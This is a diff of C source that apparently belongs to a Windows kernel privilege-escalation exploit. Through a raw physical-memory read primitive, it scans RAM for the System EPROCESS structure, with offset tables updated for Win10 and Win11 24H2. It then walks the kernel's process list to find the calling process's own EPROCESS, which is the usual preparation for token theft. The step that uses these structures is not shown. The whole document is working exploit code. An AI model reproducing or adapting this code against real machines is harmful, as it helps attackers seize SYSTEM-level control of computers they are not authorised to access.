@@ -233,27 +233,43 @@ static uint64_t pva_to_pa(uint64_t proc_cr3, uint64_t va)
  * §5  SYSTEM EPROCESS SCAN + OWN EPROCESS FIND
  * ══════════════════════════════════════════════════════════════════════════ */
 
+/* Dual-layout table: Win11 24H2+ first, then Win10/pre-24H2 */
+typedef struct { uint32_t pid; uint32_t links; uint32_t name; } EpLyt;
+static const EpLyt g_ep_lyts[] = {
+    { 0x1D0, 0x1D8, 0x338 }, /* Win11 24H2+ (build 26100+) */
+    { 0x440, 0x448, 0x5A8 }, /* Win10 / Win11 pre-24H2     */
+    { 0x440, 0x448, 0x5B8 }, /* Win10 variant              */
+};
+static const EpLyt *g_ep_lyt = NULL; /* set by find_system_eproc_pa */
+
 static uint64_t find_system_eproc_pa(void)
 {
-    static const uint32_t noffs[] = { 0x5A8, 0x5B8, 0x5B0, 0x5C0 };
+    uint8_t page[0x1000];
     for (int r = 0; r < g_nranges; r++) {
-        uint64_t base = (g_ranges[r].base + 7) & ~7ULL;
+        uint64_t base = (g_ranges[r].base + 0xFFF) & ~0xFFFULL;
         uint64_t end  = g_ranges[r].base + g_ranges[r].size;
-        for (uint64_t pa = base; pa + 0xA00 < end; pa += 8) {
-            uint32_t pid = 0;
-            if (!phys_read(pa + 0x440, &pid, 4)) continue;
-            if (pid != 4) continue;
-            for (int n = 0; n < 4; n++) {
-                char nm[8];
-                if (!phys_read(pa + noffs[n], nm, 8)) continue;
-                if (memcmp(nm, "System\0\0", 8)) continue;
-                uint64_t dtb = phys_read64(pa + 0x028);
-                /* Physical CR3: page-aligned, >64KB, bits 40+ must be zero */
-                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
-                uint64_t flink = phys_read64(pa + 0x448);
-                uint64_t blink = phys_read64(pa + 0x450);
-                if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;
-                return pa;
+        if (end > base + 0x20000000ULL) end = base + 0x20000000ULL; /* 512 MB cap */
+        for (uint64_t page_pa = base; page_pa < end; page_pa += 0x1000) {
+            if (!phys_read(page_pa, page, 0x1000)) continue;
+            for (int sub = 0; sub <= (int)(0x1000 - 0x400); sub += 8) {
+                for (int vi = 0; vi < 3; vi++) {
+                    const EpLyt *L = &g_ep_lyts[vi];
+                    if ((sub + L->pid + 4) > 0x1000) continue;
+                    uint32_t pid = 0; memcpy(&pid, page + sub + L->pid, 4);
+                    if (pid != 4) continue;
+                    if ((sub + L->name + 8) > 0x1000) continue;
+                    char nm[8]; memcpy(nm, page + sub + L->name, 8);
+                    if (memcmp(nm, "System\0\0", 7) != 0) continue;
+                    uint64_t dtb; memcpy(&dtb, page + sub + 0x028, 8);
+                    if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
+                    if ((sub + L->links + 16) > 0x1000) continue;
+                    uint64_t flink, blink;
+                    memcpy(&flink, page + sub + L->links,     8);
+                    memcpy(&blink, page + sub + L->links + 8, 8);
+                    if ((flink >> 48) != 0xFFFF || (blink >> 48) != 0xFFFF) continue;
+                    g_ep_lyt = L;
+                    return page_pa + (uint64_t)sub;
+                }
             }
         }
     }
@@ -263,8 +279,12 @@ static uint64_t find_system_eproc_pa(void)
 /* Walk ActiveProcessLinks from system_pa to find our own EPROCESS by PID */
 static uint64_t find_own_eproc_pa(uint64_t system_pa)
 {
+    if (!g_ep_lyt) return 0;
+    uint32_t links = g_ep_lyt->links;
+    uint32_t pid_off = g_ep_lyt->pid;
+
     DWORD own_pid = GetCurrentProcessId();
-    uint64_t flink_va = phys_read64(system_pa + 0x448);
+    uint64_t flink_va = phys_read64(system_pa + links);
     if (!flink_va) return 0;
     uint64_t flink_pa = kva_to_pa(flink_va);
     if (!flink_pa) return 0;
@@ -272,17 +292,17 @@ static uint64_t find_own_eproc_pa(uint64_t system_pa)
     /* Reconstruct System EPROCESS VA from blink of first entry */
     uint64_t blink_va = phys_read64(flink_pa + 8);
     if (!blink_va) return 0;
-    uint64_t sys_va = blink_va - 0x448;
+    uint64_t sys_va = blink_va - links;
 
     uint64_t cur_va = sys_va;
     for (int i = 0; i < 1024; i++) {
         uint64_t cur_pa = kva_to_pa(cur_va);
         if (!cur_pa) break;
-        uint32_t p = 0; phys_read(cur_pa + 0x440, &p, 4);
+        uint32_t p = 0; phys_read(cur_pa + pid_off, &p, 4);
         if (p == own_pid) return cur_pa;
-        uint64_t next_flink = phys_read64(cur_pa + 0x448);
+        uint64_t next_flink = phys_read64(cur_pa + links);
         if (!next_flink || next_flink == flink_va) break;
-        cur_va = next_flink - 0x448;
+        cur_va = next_flink - links;
     }
     return 0;
 }
